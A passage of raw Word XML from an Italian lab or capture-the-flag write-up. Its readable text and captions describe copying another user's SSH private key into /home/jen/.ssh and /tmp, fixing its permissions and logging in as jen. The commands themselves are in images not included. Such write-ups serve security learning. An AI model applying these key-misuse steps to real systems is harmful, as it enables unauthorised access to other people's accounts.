        </w:rPr>
        <w:t xml:space="preserve"> di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>douglas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> all'interno di </w:t>
      </w:r>
      <w:r w:rsidR="000A6C8E" w:rsidRPr="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>/home/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000A6C8E" w:rsidRPr="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>jen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000A6C8E" w:rsidRPr="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>/.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000A6C8E" w:rsidRPr="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>ssh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> in modo da poter essere registrati come </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>jen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>. Pertanto, abbiamo eseguito i seguenti comandi indicati nella Figura 24.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A39F806" w14:textId="4F3DEE53" w:rsidR="00794C8B" w:rsidRDefault="00794C8B" w:rsidP="00794C8B">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251704320" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="15ECCCF5" wp14:editId="40A5F8AB">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>2447856</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1446850</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="734190" cy="226426"/>
                <wp:effectExtent l="0" t="0" r="27940" b="21590"/>
                <wp:wrapNone/>
                <wp:docPr id="1938971082" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="734190" cy="226426"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="6FB661E9" w14:textId="77777777" w:rsidR="00794C8B" w:rsidRDefault="00794C8B" w:rsidP="00794C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CCCF5" id="_x0000_s1050" style="position:absolute;left:0;text-align:left;margin-left:192.75pt;margin-top:113.95pt;width:57.8pt;height:17.8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is2UAIAAJ0EAAAOAAAAZHJzL2Uyb0RvYy54bWysVE1v2zAMvQ/YfxB0X+147ldQp8hSZBhQ&#10;tAXaoWdFlmIDsqhRSuzu14+Snabrdhp2UUiRfiSfHnN1PXSG7RX6FmzFZyc5Z8pKqFu7rfj3p/Wn&#10;C858ELYWBqyq+Ivy/Hrx8cNV7+aqgAZMrZARiPXz3lW8CcHNs8zLRnXCn4BTloIasBOBXNxmNYqe&#10;0DuTFXl+lvWAtUOQynu6vRmDfJHwtVYy3GvtVWCm4tRbSCemcxPPbHEl5lsUrmnl1Ib4hy460Voq&#10;+gp1I4JgO2z/gOpaieBBhxMJXQZat1KlGWiaWf5umsdGOJVmIXK8e6XJ/z9Yebd/dA9INPTOzz2Z&#10;cYpBYxd/qT82JLJeXslSQ2CSLs8/l7NLolRSqCjOyuIskpkdP3bow1cFHYtGxZHeIlEk9rc+jKmH&#10;lFjLwro1Jr2Hsawn0NMyj/iCZKGNCGR2rq64t1vOhNmS3mTABOnBtHX8PAJ53G5WBtlexDfPv+Tr&#10;9MzU2W9psfaN8M2Yl0LTAMZGGJXUM7V6JCdaYdgMrKVWijJ+Eq82UL88IEMYFeadXLdU4Fb48CCQ&#10;JEWT0JqEezq0ARoPJouzBvDn3+5jPr00RTnrSaI0+o+dQMWZ+WZJA5ezsoyaTk55el6Qg28jm7cR&#10;u+tWQIzMaCGdTGbMD+ZgaoTumbZpGatSSFhJtUeSJ2cVxtWhfZRquUxppGMnwq19dDKCR+oitU/D&#10;s0A3vX0g0dzBQc5i/k4CY+4oguUugG6TPo68kq6iQzuQFDbta1yyt37KOv6rLH4BAAD//wMAUEsD&#10;BBQABgAIAAAAIQBAncO84AAAAAsBAAAPAAAAZHJzL2Rvd25yZXYueG1sTI/LasMwEEX3hf6DmEB3&#10;jfzAruNaDqVQ6CKF5vEBijWxTayRsZTE+ftOV+1yZg53zq3Wsx3EFSffO1IQLyMQSI0zPbUKDvuP&#10;5wKED5qMHhyhgjt6WNePD5UujbvRFq+70AoOIV9qBV0IYymlbzq02i/diMS3k5usDjxOrTSTvnG4&#10;HWQSRbm0uif+0OkR3ztszruLVWA3zWoKn216+E6L+6bfB3myX0o9Lea3VxAB5/AHw68+q0PNTkd3&#10;IePFoCAtsoxRBUnysgLBRBbFMYgjb/I0B1lX8n+H+gcAAP//AwBQSwECLQAUAAYACAAAACEAtoM4&#10;kv4AAADhAQAAEwAAAAAAAAAAAAAAAAAAAAAAW0NvbnRlbnRfVHlwZXNdLnhtbFBLAQItABQABgAI&#10;AAAAIQA4/SH/1gAAAJQBAAALAAAAAAAAAAAAAAAAAC8BAABfcmVscy8ucmVsc1BLAQItABQABgAI&#10;AAAAIQDFPis2UAIAAJ0EAAAOAAAAAAAAAAAAAAAAAC4CAABkcnMvZTJvRG9jLnhtbFBLAQItABQA&#10;BgAIAAAAIQBAncO84AAAAAsBAAAPAAAAAAAAAAAAAAAAAKoEAABkcnMvZG93bnJldi54bWxQSwUG&#10;AAAAAAQABADzAAAAtwUAAAAA&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="6FB661E9" w14:textId="77777777" w:rsidR="00794C8B" w:rsidRDefault="00794C8B" w:rsidP="00794C8B">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00F83054" w:rsidRPr="00F83054">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="FF0000"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="301CA443" wp14:editId="7EF3115C">
            <wp:extent cx="5274310" cy="3088640"/>
            <wp:effectExtent l="0" t="0" r="2540" b="0"/>
            <wp:docPr id="14013476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47644" name="Immagine 1" descr="Immagine che contiene testo, schermata, Carattere&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId55"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5274310" cy="3088640"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="000A6C8E" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Figura 2</w:t>
      </w:r>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidR="000A6C8E" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">copia della chiave </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ssh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>douglas</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> all’interno di </w:t>
      </w:r>
      <w:r w:rsidR="000A6C8E" w:rsidRPr="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>/home/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000A6C8E" w:rsidRPr="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>jen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="000A6C8E" w:rsidRPr="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>/.</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="000A6C8E" w:rsidRPr="000A6C8E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ssh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="2EE85DA3" w14:textId="77777777" w:rsidR="00794C8B" w:rsidRDefault="00794C8B" w:rsidP="00794C8B">
      <w:pPr>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74217922" w14:textId="46D33015" w:rsidR="00794C8B" w:rsidRPr="00877FB6" w:rsidRDefault="00794C8B" w:rsidP="00794C8B">
      <w:pPr>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00877FB6">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Ora possiamo copiare </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00877FB6">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>id_rsa</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00877FB6">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> in /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00877FB6">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>tmp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00877FB6">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> e andare a cambiare i permessi e successivamente proviamo ad accedere tramite </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00877FB6">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ssh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00877FB6">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> come </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00877FB6">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>jen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00877FB6">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="273C15FA" w14:textId="47E981AE" w:rsidR="00B66AB1" w:rsidRPr="000A6C8E" w:rsidRDefault="00E7474C" w:rsidP="00794C8B">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251706368" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="429108AB" wp14:editId="65FE9D7F">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:align>left</wp:align>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>2422539</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1061238" cy="139700"/>
                <wp:effectExtent l="0" t="0" r="24765" b="12700"/>
                <wp:wrapNone/>
                <wp:docPr id="896257254" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="1061238" cy="139700"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="3A419914" w14:textId="77777777" w:rsidR="00794C8B" w:rsidRDefault="00794C8B" w:rsidP="00794C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108AB" id="_x0000_s1051" style="position:absolute;left:0;text-align:left;margin-left:0;margin-top:190.75pt;width:83.55pt;height:11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sb5UwIAAJ4EAAAOAAAAZHJzL2Uyb0RvYy54bWysVEtv2zAMvg/YfxB0X2ynabsGdYqsRYYB&#10;QRugHXpmZCk2IEsapcTOfv0oOY+u22nYRSZFio+PH31717ea7ST6xpqSF6OcM2mErRqzKfn3l8Wn&#10;z5z5AKYCbY0s+V56fjf7+OG2c1M5trXVlURGQYyfdq7kdQhummVe1LIFP7JOGjIqiy0EUnGTVQgd&#10;RW91Ns7zq6yzWDm0QnpPtw+Dkc9SfKWkCE9KeRmYLjnVFtKJ6VzHM5vdwnSD4OpGHMqAf6iihcZQ&#10;0lOoBwjAttj8EaptBFpvVRgJ22ZWqUbI1AN1U+TvunmuwcnUC4Hj3Qkm///Cisfds1shwdA5P/Uk&#10;xi56hW38Un2sT2DtT2DJPjBBl0V+VYwvaLyCbMXFzXWe0MzOrx368FXalkWh5EjDSBjBbukDZSTX&#10;o0tMZuyi0ToNRBvWlXx8OaGYTADxQmkIJLauKrk3G85Ab4hwImAK6a1uqvg8BvK4Wd9rZDuIQ8+/&#10;5ItjZb+5xdwP4OvBL5kiHagqbWIYmehzKPWMTpRCv+5ZQ6WML+OTeLW21X6FDO1AMe/EoqEES/Bh&#10;BUicok5oT8ITHUpbas8eJM5qiz//dh/9adRk5awjjlLrP7aAkjP9zRAJborJJJI6KZPL6zEp+Nay&#10;fmsx2/beEiIFbaQTSYz+QR9FhbZ9pXWax6xkAiMo9wDyQbkPw+7QQgo5nyc3IrKDsDTPTsTgEboI&#10;7Uv/CugOsw/Emkd75DNM31Fg8B1IMN8Gq5rEjzOuNJao0BKkAR0WNm7ZWz15nX8rs18AAAD//wMA&#10;UEsDBBQABgAIAAAAIQB12YPs3gAAAAgBAAAPAAAAZHJzL2Rvd25yZXYueG1sTI/BTsMwEETvSPyD&#10;tUjcqBNCSwjZVAgJiUORStsPcONtEhGvo3jbpn+Pe4LjaEYzb8rl5Hp1ojF0nhHSWQKKuPa24wZh&#10;t/14yEEFMWxN75kQLhRgWd3elKaw/szfdNpIo2IJh8IgtCJDoXWoW3ImzPxAHL2DH52RKMdG29Gc&#10;Y7nr9WOSLLQzHceF1gz03lL9szk6BLeqX0b5bLLdOssvq24r+uC+EO/vprdXUEKT/IXhih/RoYpM&#10;e39kG1SPEI8IQpanc1BXe/GcgtojPCXZHHRV6v8Hql8AAAD//wMAUEsBAi0AFAAGAAgAAAAhALaD&#10;OJL+AAAA4QEAABMAAAAAAAAAAAAAAAAAAAAAAFtDb250ZW50X1R5cGVzXS54bWxQSwECLQAUAAYA&#10;CAAAACEAOP0h/9YAAACUAQAACwAAAAAAAAAAAAAAAAAvAQAAX3JlbHMvLnJlbHNQSwECLQAUAAYA&#10;CAAAACEAql7G+VMCAACeBAAADgAAAAAAAAAAAAAAAAAuAgAAZHJzL2Uyb0RvYy54bWxQSwECLQAU&#10;AAYACAAAACEAddmD7N4AAAAIAQAADwAAAAAAAAAAAAAAAACtBAAAZHJzL2Rvd25yZXYueG1sUEsF&#10;BgAAAAAEAAQA8wAAALgFAAAAAA==&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="3A419914" w14:textId="77777777" w:rsidR="00794C8B" w:rsidRDefault="00794C8B" w:rsidP="00794C8B">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00794C8B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251708416" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="05F7E167" wp14:editId="338462B4">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>1226829</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1361588</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1448356" cy="133364"/>
                <wp:effectExtent l="0" t="0" r="19050" b="19050"/>
                <wp:wrapNone/>
                <wp:docPr id="289536638" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="1448356" cy="133364"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:noFill/>
                        <a:ln w="25400" cap="flat" cmpd="sng" algn="ctr">
                          <a:solidFill>
                            <a:srgbClr val="00B0F0"/>
                          </a:solidFill>
                          <a:prstDash val="solid"/>
                        </a:ln>
                        <a:effectLst/>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="441FF244" w14:textId="77777777" w:rsidR="00794C8B" w:rsidRDefault="00794C8B" w:rsidP="00794C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7E167" id="_x0000_s1052" style="position:absolute;left:0;text-align:left;margin-left:96.6pt;margin-top:107.2pt;width:114.05pt;height:10.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Z7UgIAAJ4EAAAOAAAAZHJzL2Uyb0RvYy54bWysVEtv2zAMvg/YfxB0X+w81wZ1iqxBhgFF&#10;W6AdemZkKTYgSxqlxO5+/SjZTbpup2EXmRQpPj5+9NV112h2lOhrawo+HuWcSSNsWZt9wb8/bT9d&#10;cOYDmBK0NbLgL9Lz69XHD1etW8qJrawuJTIKYvyydQWvQnDLLPOikg34kXXSkFFZbCCQivusRGgp&#10;eqOzSZ4vstZi6dAK6T3dbnojX6X4SkkR7pXyMjBdcKotpBPTuYtntrqC5R7BVbUYyoB/qKKB2lDS&#10;U6gNBGAHrP8I1dQCrbcqjIRtMqtULWTqgboZ5++6eazAydQLgePdCSb//8KKu+Oje0CCoXV+6UmM&#10;XXQKm/il+liXwHo5gSW7wARdjmezi+l8wZkg23g6nS5mEc3s/NqhD1+lbVgUCo40jIQRHG996F1f&#10;XWIyY7e11mkg2rC24JP5LKeZCSBeKA2BxMaVBfdmzxnoPRFOBEwhvdV1GZ/HQB73uxuN7Ahx6PmX&#10;fJvmTJX95hZzb8BXvV8yDQ1oE8PIRJ+h1DM6UQrdrmM1lTJZxCfxamfLlwdkaHuKeSe2NSW4BR8e&#10;AIlT1AntSbinQ2lL7dlB4qyy+PNv99GfRk1WzlriKLX+4wAoOdPfDJHgkmYQSZ2U2fzzhBR8a9m9&#10;tZhDc2MJkTFtpBNJjP5Bv4oKbfNM67SOWckERlDuHuRBuQn97tBCCrleJzcisoNwax6diMEjdBHa&#10;p+4Z0A2zD8SaO/vKZ1i+o0Dv25NgfQhW1YkfZ1yJV1GhJUgMGxY2btlbPXmdfyurXwAAAP//AwBQ&#10;SwMEFAAGAAgAAAAhAOToVujfAAAACwEAAA8AAABkcnMvZG93bnJldi54bWxMj8FOwzAMhu9IvENk&#10;JG4sbVPQVppOCAmJw5Bg2wNkjddWNE6VZFv39pgTHH/70+/P9Xp2ozhjiIMnDfkiA4HUejtQp2G/&#10;e3tYgojJkDWjJ9RwxQjr5vamNpX1F/rC8zZ1gksoVkZDn9JUSRnbHp2JCz8h8e7ogzOJY+ikDebC&#10;5W6URZY9SWcG4gu9mfC1x/Z7e3Ia3KZdhfTeqf2nWl43wy7Jo/vQ+v5ufnkGkXBOfzD86rM6NOx0&#10;8CeyUYycV6pgVEORlyUIJsoiVyAOPFGPJcimlv9/aH4AAAD//wMAUEsBAi0AFAAGAAgAAAAhALaD&#10;OJL+AAAA4QEAABMAAAAAAAAAAAAAAAAAAAAAAFtDb250ZW50X1R5cGVzXS54bWxQSwECLQAUAAYA&#10;CAAAACEAOP0h/9YAAACUAQAACwAAAAAAAAAAAAAAAAAvAQAAX3JlbHMvLnJlbHNQSwECLQAUAAYA&#10;CAAAACEAgb+Ge1ICAACeBAAADgAAAAAAAAAAAAAAAAAuAgAAZHJzL2Uyb0RvYy54bWxQSwECLQAU&#10;AAYACAAAACEA5OhW6N8AAAALAQAADwAAAAAAAAAAAAAAAACsBAAAZHJzL2Rvd25yZXYueG1sUEsF&#10;BgAAAAAEAAQA8wAAALgFAAAAAA==&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="441FF244" w14:textId="77777777" w:rsidR="00794C8B" w:rsidRDefault="00794C8B" w:rsidP="00794C8B">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap anchorx="margin"/>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0613F9E4" wp14:editId="204267C6">
            <wp:extent cx="5279390" cy="2803525"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="311666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9390" cy="2803525"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00794C8B" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>Figura 2</w:t>
      </w:r>
      <w:r w:rsidR="00794C8B">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="00794C8B" w:rsidRPr="006C1913">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00794C8B">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">accedere </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00794C8B">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>com</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00794C8B">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00794C8B">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>jen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00794C8B">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> via </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00794C8B">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>ssh</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="438E5088" w14:textId="63C8EDF0" w:rsidR="00B66AB1" w:rsidRDefault="00794C8B" w:rsidP="00794C8B">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Dopo essere entrati come </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>jen</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
